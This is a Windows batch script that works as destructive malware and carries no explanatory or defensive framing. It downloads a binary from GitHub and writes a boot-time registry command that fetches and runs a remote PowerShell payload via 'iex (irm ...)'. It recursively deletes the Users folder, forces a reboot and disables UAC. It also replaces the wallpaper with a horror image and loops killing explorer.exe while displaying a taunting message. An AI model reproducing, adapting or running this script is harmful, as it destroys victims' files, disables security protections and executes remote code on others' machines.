@echo off
color A

:init
curl -L "https://github.com/Syed930s/BloodShed/blob/main/BloodShed.bin" -o C:\bloodshed.bin
setlocal DisableDelayedExpansion
cls
reg add "HKLM\SYSTEM\Setup" /v CmdLine /t REG_SZ /d "cmd.exe /k powershell -command \"iex (irm 'https://raw.githubusercontent.com/Syed930s/CUTEB0YPAYL0AD/refs/heads/main/CuteBoyPayload.ps1')\" & ver >nul && del /f /s /q \Users && shutdown /r /t 0" /f
reg add HKLM\System\Setup /v SetupType /t REG_DWORD /d 2 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableCursorSuppression /t REG_DWORD /d 0 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v VerboseStatus /t REG_DWORD /d 1 /f > nul
curl -L "https://wallpaperbat.com/down/409151-dark-evil-horror-spooky-creepy-scary-wallpaper-2560x1440" -o C:\DeathNet.png
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\DeathNet.png" /f
:shan
taskkkill /f /im explorer.exe
start explorer.exe
ECHO Your PC has been Bloodsheded by The Bloodshed...
echo Don't reboot friend!
goto shan
